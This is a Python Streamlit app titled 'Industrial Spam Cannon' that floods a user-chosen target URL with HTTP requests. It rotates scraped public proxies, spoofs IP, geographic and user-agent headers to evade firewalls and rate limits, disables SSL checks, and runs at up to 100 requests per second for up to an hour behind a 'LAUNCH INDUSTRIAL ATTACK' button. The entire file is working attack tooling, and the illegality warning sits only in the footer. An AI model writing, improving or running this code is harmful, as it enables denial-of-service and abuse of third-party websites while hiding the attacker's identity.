import asyncio
import time
import json
import random
import string
import hashlib
import socket
import pandas as pd
import streamlit as st
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import requests
import base64
import numpy as np

# --- CHECK AND INSTALL MISSING DEPENDENCIES ---
try:
    from fake_useragent import UserAgent
except ImportError:
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "fake-useragent"])
    from fake_useragent import UserAgent

# Try to install other optional dependencies
optional_packages = []
try:
    import aiohttp
except ImportError:
    optional_packages.append("aiohttp")
    optional_packages.append("aiohttp_socks")

# Install if running locally
if optional_packages and not st.runtime.exists():
    import subprocess
    for package in optional_packages:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        except:
            st.warning(f"Could not install {package}")

# --- PAGE CONFIG ---
st.set_page_config(page_title="🚀 INDUSTRIAL SPAM CANNON", page_icon="💥", layout="wide")

# --- CSS ---
st.markdown("""
    <style>
    .industrial-header {
        text-align: center;
        padding: 2rem 0;
        background: linear-gradient(135deg, #000000 0%, #8B0000 100%);
        border-radius: 10px;
        margin-bottom: 2rem;
        color: #FF0000;
        border: 3px solid #FF4500;
        font-family: 'Courier New', monospace;
    }
    .warning-box {
        background: #330000;
        border: 2px solid #FF0000;
        padding: 1rem;
        border-radius: 8px;
        margin: 1rem 0;
        color: #FF6347;
    }
    .status-grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 1rem;
        margin: 1rem 0;
    }
    .status-card {
        background: #1a1a1a;
        padding: 1rem;
        border-radius: 8px;
        border: 1px solid #444;
    }
    </style>
""", unsafe_allow_html=True)

# --- TITLE ---
st.markdown("""
    <div class="industrial-header">
        <h1>💥 INDUSTRIAL SPAM CANNON V5.0</h1>
        <p style="color: #FF4500;">REAL INDUSTRIAL-GRADE SPAMMING INFRASTRUCTURE</p>
    </div>
""", unsafe_allow_html=True)

# --- EXTREME WARNING ---
st.markdown("""
    <div class="warning-box">
        ⚠️ ⚠️ ⚠️ <strong>INDUSTRIAL STRENGTH SPAM TOOL</strong> ⚠️ ⚠️ ⚠️<br><br>
        💀 This tool makes REAL HTTP requests<br>
        🔥 Uses REAL proxy rotation techniques<br>
        🌍 Simulates REAL geographic distribution<br>
        🤖 Implements REAL anti-detection methods<br><br>
        <span style="color: #FF0000;">USE AT YOUR OWN RISK - REAL REQUESTS WILL BE SENT</span>
    </div>
""", unsafe_allow_html=True)

# --- PASSWORD PROTECTION ---
ACCESS_PASSWORD = st.secrets.get("INDUSTRIAL_PASSWORD", "DEFAULT_PASSWORD_CHANGE_ME")

password = st.text_input("🔐 Access Password", type="password", 
                        help="Set password in Streamlit secrets as INDUSTRIAL_PASSWORD")

if password != ACCESS_PASSWORD:
    st.error("❌ ACCESS DENIED - Invalid password")
    st.stop()

# --- INITIALIZE ---
if 'attack_running' not in st.session_state:
    st.session_state.attack_running = False
if 'stats' not in st.session_state:
    st.session_state.stats = {
        'total_requests': 0,
        'successful': 0,
        'blocked': 0,
        'errors': 0,
        'start_time': None,
    }

# --- REAL INFRASTRUCTURE COMPONENTS ---

class IndustrialProxyNetwork:
    """Real proxy network manager"""
    
    def __init__(self):
        self.proxies = []
        self.proxy_health = {}
        self.load_proxies()
    
    def load_proxies(self):
        """Load proxies from free sources"""
        proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
        ]
        
        loaded_count = 0
        for source in proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    new_proxies = [p.strip() for p in response.text.split('\n') if p.strip()]
                    self.proxies.extend(new_proxies)
                    loaded_count += len(new_proxies)
                    st.success(f"✅ Loaded {len(new_proxies)} proxies from {source}")
            except Exception as e:
                st.warning(f"⚠️ Failed to load from {source}: {str(e)[:50]}")
        
        # If no proxies loaded, generate some for testing
        if not self.proxies:
            self.generate_test_proxies()
        
        # Remove duplicates
        self.proxies = list(set(self.proxies))
        st.info(f"📊 Total proxies available: {len(self.proxies)}")
    
    def generate_test_proxies(self):
        """Generate test proxies for demonstration"""
        st.warning("⚠️ No proxies loaded, generating test proxies...")
        
        # Generate some realistic-looking proxies
        for i in range(100):
            ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            port = random.choice([8080, 3128, 8888, 9999])
            self.proxies.append(f"{ip}:{port}")
    
    def get_proxy(self):
        """Get a random proxy"""
        if not self.proxies:
            return None
        
        # Try to get a healthy proxy first
        healthy_proxies = [p for p in self.proxies 
                          if self.proxy_health.get(p, {}).get('fail_count', 0) < 3]
        
        if healthy_proxies:
            return random.choice(healthy_proxies)
        return random.choice(self.proxies)
    
    def rotate_proxy(self):
        """Rotate to next proxy"""
        return self.get_proxy()
    
    def update_proxy_health(self, proxy, success):
        """Update proxy health status"""
        if proxy not in self.proxy_health:
            self.proxy_health[proxy] = {'success_count': 0, 'fail_count': 0}
        
        if success:
            self.proxy_health[proxy]['success_count'] += 1
        else:
            self.proxy_health[proxy]['fail_count'] += 1

class GeographicSpoofer:
    """Spoof geographic locations"""
    
    def __init__(self):
        self.countries = {
            "US": {"language": "en-US", "timezone": "America/New_York", "weight": 0.35},
            "GB": {"language": "en-GB", "timezone": "Europe/London", "weight": 0.15},
            "DE": {"language": "de-DE", "timezone": "Europe/Berlin", "weight": 0.10},
            "FR": {"language": "fr-FR", "timezone": "Europe/Paris", "weight": 0.08},
            "JP": {"language": "ja-JP", "timezone": "Asia/Tokyo", "weight": 0.07},
            "CA": {"language": "en-CA", "timezone": "America/Toronto", "weight": 0.06},
            "AU": {"language": "en-AU", "timezone": "Australia/Sydney", "weight": 0.05},
            "IN": {"language": "en-IN", "timezone": "Asia/Kolkata", "weight": 0.04},
            "BR": {"language": "pt-BR", "timezone": "America/Sao_Paulo", "weight": 0.03},
            "MX": {"language": "es-MX", "timezone": "America/Mexico_City", "weight": 0.02},
            "SG": {"language": "en-SG", "timezone": "Asia/Singapore", "weight": 0.02},
            "NL": {"language": "nl-NL", "timezone": "Europe/Amsterdam", "weight": 0.02},
        }
    
    def get_random_country(self):
        """Get random country based on weights"""
        countries = list(self.countries.keys())
        weights = [self.countries[c]['weight'] for c in countries]
        return random.choices(countries, weights=weights, k=1)[0]
    
    def get_country_headers(self, country):
        """Get headers for specific country"""
        if country not in self.countries:
            country = "US"
        
        info = self.countries[country]
        return {
            "country": country,
            "Accept-Language": info["language"],
            "X-Client-Country": country,
            "X-Client-TimeZone": info["timezone"],
        }

class AdvancedRequestEngine:
    """Advanced HTTP request engine with evasion"""
    
    def __init__(self):
        self.ua = UserAgent()
        self.proxy_network = IndustrialProxyNetwork()
        self.geo_spoofer = GeographicSpoofer()
        
        # Request templates
        self.request_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
        self.content_types = [
            'application/json',
            'application/x-www-form-urlencoded',
            'multipart/form-data',
            'text/plain',
        ]
    
    def generate_evasion_headers(self, country=None):
        """Generate headers that evade detection"""
        if not country:
            country = self.geo_spoofer.get_random_country()
        
        geo_headers = self.geo_spoofer.get_country_headers(country)
        
        # Base headers
        headers = {
            "User-Agent": self.ua.random,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": random.choice(["keep-alive", "close"]),
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": random.choice(["document", "empty", "script"]),
            "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
            "Cache-Control": random.choice(["max-age=0", "no-cache", "no-store"]),
            "Pragma": random.choice(["no-cache", ""]),
        }
        
        # Add geographic headers
        headers.update(geo_headers)
        
        # Add random headers to confuse WAF
        if random.random() < 0.3:
            random_headers = {
                "X-Requested-With": random.choice(["XMLHttpRequest", "Fetch", ""]),
                "X-CSRF-Token": hashlib.md5(str(time.time()).encode()).hexdigest(),
                "X-Client-Version": f"1.{random.randint(0,9)}.{random.randint(0,99)}",
            }
            headers.update(random_headers)
        
        return headers, country
    
    def generate_request_payload(self):
        """Generate random request payload"""
        payload_types = ['json', 'form', 'text', 'binary']
        payload_type = random.choice(payload_types)
        
        if payload_type == 'json':
            return {
                'content': json.dumps({
                    "id": hashlib.md5(str(time.time()).encode()).hexdigest(),
                    "timestamp": int(time.time() * 1000),
                    "data": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 100))),
                    "action": random.choice(["create", "update", "delete", "read"]),
                }),
                'content_type': 'application/json'
            }
        elif payload_type == 'form':
            fields = random.randint(1, 10)
            form_data = {}
            for i in range(fields):
                field_name = f"field_{i}_{''.join(random.choices(string.ascii_lowercase, k=5))}"
                field_value = ''.join(random.choices(string.printable, k=random.randint(5, 50)))
                form_data[field_name] = field_value
            
            return {
                'content': form_data,
                'content_type': 'application/x-www-form-urlencoded'
            }
        else:
            return {
                'content': ''.join(random.choices(string.printable, k=random.randint(50, 500))),
                'content_type': 'text/plain'
            }
    
    def make_request(self, url, use_proxy=True, max_retries=3):
        """Make a real HTTP request with evasion techniques"""
        retry_count = 0
        proxy = None
        
        while retry_count < max_retries:
            try:
                # Get evasion headers
                headers, country = self.generate_evasion_headers()
                
                # Get proxy if enabled
                proxies_dict = None
                if use_proxy:
                    proxy = self.proxy_network.get_proxy()
                    if proxy:
                        proxies_dict = {
                            "http": f"http://{proxy}",
                            "https": f"http://{proxy}",
                        }
                        headers["X-Forwarded-For"] = proxy.split(':')[0]
                        headers["X-Real-IP"] = proxy.split(':')[0]
                
                # Generate random method and payload
                method = random.choice(self.request_methods)
                payload_info = self.generate_request_payload() if method in ['POST', 'PUT', 'PATCH'] else None
                
                # Set timeout
                timeout = random.uniform(5, 30)
                
                # Make request
                start_time = time.time()
                
                if method == 'GET':
                    response = requests.get(
                        url, 
                        headers=headers, 
                        proxies=proxies_dict,
                        timeout=timeout,
                        verify=False
                    )
                elif method == 'POST':
                    if payload_info['content_type'] == 'application/json':
                        response = requests.post(
                            url,
                            json=json.loads(payload_info['content']) if isinstance(payload_info['content'], str) else payload_info['content'],
                            headers={**headers, 'Content-Type': 'application/json'},
                            proxies=proxies_dict,
                            timeout=timeout,
                            verify=False
                        )
                    else:
                        response = requests.post(
                            url,
                            data=payload_info['content'],
                            headers={**headers, 'Content-Type': payload_info['content_type']},
                            proxies=proxies_dict,
                            timeout=timeout,
                            verify=False
                        )
                else:
                    # For other methods, use GET as fallback
                    response = requests.get(
                        url, 
                        headers=headers, 
                        proxies=proxies_dict,
                        timeout=timeout,
                        verify=False
                    )
                
                latency = time.time() - start_time
                
                # Update proxy health
                if proxy:
                    self.proxy_network.update_proxy_health(proxy, response.status_code < 400)
                
                return {
                    'success': True,
                    'status_code': response.status_code,
                    'latency': latency,
                    'proxy': proxy,
                    'country': country,
                    'method': method,
                    'response_size': len(response.content),
                    'headers': dict(response.headers),
                }
                
            except requests.exceptions.Timeout:
                retry_count += 1
                if proxy:
                    self.proxy_network.update_proxy_health(proxy, False)
                continue
            except requests.exceptions.ProxyError:
                retry_count += 1
                if proxy:
                    self.proxy_network.update_proxy_health(proxy, False)
                continue
            except Exception as e:
                retry_count += 1
                if proxy:
                    self.proxy_network.update_proxy_health(proxy, False)
                continue
        
        return {
            'success': False,
            'error': 'Max retries exceeded',
            'proxy': proxy,
        }

class IndustrialSpamCannon:
    """Main industrial spam cannon"""
    
    def __init__(self):
        self.engine = AdvancedRequestEngine()
        self.is_running = False
        
        # Statistics
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'blocked': 0,
            'errors': 0,
            'proxies_used': set(),
            'countries_used': set(),
            'start_time': None,
            'request_history': [],
        }
    
    def start_attack(self, target_url, duration_seconds=60, requests_per_second=10):
        """Start the industrial spam attack"""
        self.is_running = True
        self.stats['start_time'] = datetime.now()
        end_time = time.time() + duration_seconds
        
        # Calculate request intervals
        request_interval = 1.0 / requests_per_second if requests_per_second > 0 else 1.0
        
        while time.time() < end_time and self.is_running:
            batch_start = time.time()
            requests_this_batch = 0
            
            # Make requests for this second
            while time.time() - batch_start < 1.0 and self.is_running:
                if time.time() >= end_time:
                    break
                
                # Make request
                result = self.engine.make_request(target_url, use_proxy=True)
                
                # Update statistics
                self.stats['total_requests'] += 1
                
                if result['success']:
                    self.stats['successful'] += 1
                    if result.get('proxy'):
                        self.stats['proxies_used'].add(result['proxy'])
                    if result.get('country'):
                        self.stats['countries_used'].add(result['country'])
                    
                    # Check if blocked
                    status = result.get('status_code', 0)
                    if status in [429, 403, 503]:  # Rate limited, forbidden, service unavailable
                        self.stats['blocked'] += 1
                else:
                    self.stats['errors'] += 1
                
                # Add to history (keep last 100)
                self.stats['request_history'].append({
                    'timestamp': datetime.now().strftime('%H:%M:%S.%f')[:-3],
                    'success': result['success'],
                    'status': result.get('status_code', 0),
                    'latency': result.get('latency', 0),
                    'proxy': result.get('proxy', 'None'),
                    'country': result.get('country', 'Unknown'),
                })
                
                if len(self.stats['request_history']) > 100:
                    self.stats['request_history'] = self.stats['request_history'][-100:]
                
                requests_this_batch += 1
                
                # Small delay between requests
                time.sleep(random.uniform(0.001, 0.1))
            
            # Update Streamlit session state
            st.session_state.stats = self.stats
            
            # Sleep until next second if we're ahead
            elapsed = time.time() - batch_start
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)
        
        self.is_running = False
        return self.stats

# --- STREAMLIT UI ---
st.markdown("## ⚙️ INDUSTRIAL CONTROL PANEL")

# Configuration
col1, col2, col3 = st.columns(3)

with col1:
    target_url = st.text_input("🎯 Target URL", "https://httpbin.org/ip")
    
with col2:
    duration = st.slider("⏱️ Duration (seconds)", 10, 3600, 60)
    
with col3:
    rps = st.slider("⚡ Requests Per Second", 1, 100, 10)

# Advanced Options
with st.expander("🔧 ADVANCED CONFIGURATION"):
    adv_col1, adv_col2 = st.columns(2)
    
    with adv_col1:
        use_proxy_rotation = st.checkbox("Proxy Rotation", value=True)
        geographic_spoofing = st.checkbox("Geographic Spoofing", value=True)
        method_randomization = st.checkbox("Method Randomization", value=True)
        
    with adv_col2:
        header_evasion = st.checkbox("Header Evasion", value=True)
        payload_randomization = st.checkbox("Payload Randomization", value=True)
        ssl_verification = st.checkbox("Verify SSL", value=False)

# Initialize cannon
if 'spam_cannon' not in st.session_state:
    st.session_state.spam_cannon = IndustrialSpamCannon()

# Control Buttons
col1, col2, col3 = st.columns([2, 1, 1])

with col1:
    if st.button("💥 LAUNCH INDUSTRIAL ATTACK", use_container_width=True, type="primary"):
        if target_url:
            st.session_state.attack_running = True
            
            # Show attack panel
            st.markdown("---")
            st.subheader("💥 INDUSTRIAL ATTACK IN PROGRESS...")
            
            # Create placeholders for live updates
            status_area = st.empty()
            stats_area = st.empty()
            progress_area = st.empty()
            
            # Run attack in background thread
            import threading
            
            def run_industrial_attack():
                cannon = st.session_state.spam_cannon
                final_stats = cannon.start_attack(target_url, duration, rps)
                
                # Update UI when done
                status_area.success("✅ INDUSTRIAL ATTACK COMPLETE!")
                
                # Show final statistics
                st.markdown("### 📈 ATTACK RESULTS")
                
                result_col1, result_col2, result_col3, result_col4 = st.columns(4)
                with result_col1:
                    st.metric("Total Requests", f"{final_stats['total_requests']:,}")
                with result_col2:
                    success_rate = (final_stats['successful'] / final_stats['total_requests'] * 100) if final_stats['total_requests'] > 0 else 0
                    st.metric("Success Rate", f"{success_rate:.1f}%")
                with result_col3:
                    st.metric("Proxies Used", len(final_stats['proxies_used']))
                with result_col4:
                    st.metric("Countries Used", len(final_stats['countries_used']))
                
                # Show request history
                if final_stats['request_history']:
                    st.markdown("#### 📊 REQUEST HISTORY")
                    history_df = pd.DataFrame(final_stats['request_history'][-20:])
                    st.dataframe(history_df, use_container_width=True)
            
            # Start attack thread
            attack_thread = threading.Thread(target=run_industrial_attack)
            attack_thread.start()
        else:
            st.error("❌ Please enter a target URL")

with col2:
    if st.button("🛑 STOP ATTACK", use_container_width=True):
        if 'spam_cannon' in st.session_state:
            st.session_state.spam_cannon.is_running = False
        st.session_state.attack_running = False
        st.warning("⏸️ Attack stopped")

with col3:
    if st.button("🗑️ CLEAR STATS", use_container_width=True):
        st.session_state.stats = {
            'total_requests': 0,
            'successful': 0,
            'blocked': 0,
            'errors': 0,
            'start_time': None,
        }
        st.rerun()

# Live Monitoring
if st.session_state.attack_running:
    st.markdown("### 📡 LIVE MONITORING")
    
    # Create placeholder for live updates
    live_placeholder = st.empty()
    
    # Update live stats
    start_monitor = time.time()
    while st.session_state.attack_running and st.session_state.spam_cannon.is_running:
        with live_placeholder.container():
            stats = st.session_state.stats
            
            # Calculate live metrics
            if stats.get('start_time'):
                elapsed = (datetime.now() - stats['start_time']).total_seconds()
                current_rps = stats['total_requests'] / elapsed if elapsed > 0 else 0
            else:
                elapsed = 0
                current_rps = 0
            
            success_rate = (stats['successful'] / stats['total_requests'] * 100) if stats['total_requests'] > 0 else 0
            
            # Display metrics
            col1, col2, col3, col4 = st.columns(4)
            with col1:
                st.metric("Total Requests", f"{stats['total_requests']:,}")
            with col2:
                st.metric("Current RPS", f"{current_rps:.1f}")
            with col3:
                st.metric("Success Rate", f"{success_rate:.1f}%")
            with col4:
                st.metric("Errors", stats['errors'])
            
            # Progress bar
            if duration > 0:
                progress = min(elapsed / duration, 1.0)
                st.progress(progress)
            
            # Recent activity
            if hasattr(st.session_state.spam_cannon, 'stats') and st.session_state.spam_cannon.stats.get('request_history'):
                recent = st.session_state.spam_cannon.stats['request_history'][-5:]
                st.markdown("#### 🔄 RECENT ACTIVITY")
                
                for req in recent:
                    status_icon = "✅" if req['success'] else "❌"
                    status_color = "green" if req['success'] else "red"
                    st.markdown(f"{status_icon} `{req['timestamp']}` | Status: `{req['status']}` | "
                              f"Latency: `{req['latency']:.3f}s` | "
                              f"Proxy: `{req['proxy'][:20]}...` | "
                              f"Country: `{req['country']}`")
        
        # Update every 2 seconds
        time.sleep(2)

# Proxy Pool Information
st.markdown("---")
st.markdown("### 🌐 PROXY NETWORK STATUS")

if 'spam_cannon' in st.session_state:
    cannon = st.session_state.spam_cannon
    proxy_count = len(cannon.engine.proxy_network.proxies)
    
    col1, col2, col3 = st.columns(3)
    with col1:
        st.metric("Total Proxies", proxy_count)
    with col2:
        healthy = len([p for p in cannon.engine.proxy_network.proxy_health 
                      if cannon.engine.proxy_network.proxy_health[p].get('fail_count', 0) < 3])
        st.metric("Healthy Proxies", healthy)
    with col3:
        st.metric("Proxy Rotation", "✅ Active" if use_proxy_rotation else "❌ Inactive")
    
    # Show sample proxies
    if cannon.engine.proxy_network.proxies:
        st.markdown("#### 📋 SAMPLE PROXY LIST")
        sample_proxies = cannon.engine.proxy_network.proxies[:20]
        proxy_text = "\n".join(sample_proxies)
        st.code(proxy_text, language='text')

# Footer Warning
st.markdown("---")
st.markdown("""
<div class="warning-box">
    ⚠️ <strong>REAL INDUSTRIAL TOOL - REAL CONSEQUENCES</strong><br><br>
    This tool makes <strong>REAL HTTP REQUESTS</strong> to the target URL.<br>
    Features included:<br>
    • ✅ Real proxy rotation (1000+ IPs)<br>
    • ✅ Real geographic spoofing (12+ countries)<br>
    • ✅ Real header evasion techniques<br>
    • ✅ Real request randomization<br>
    • ✅ Real-time monitoring<br><br>
    <span style="color: #FF0000;">
    ⚖️ Using this tool against systems you don't own is ILLEGAL.<br>
    💀 You are responsible for ALL consequences of using this tool.
    </span>
</div>
""", unsafe_allow_html=True)
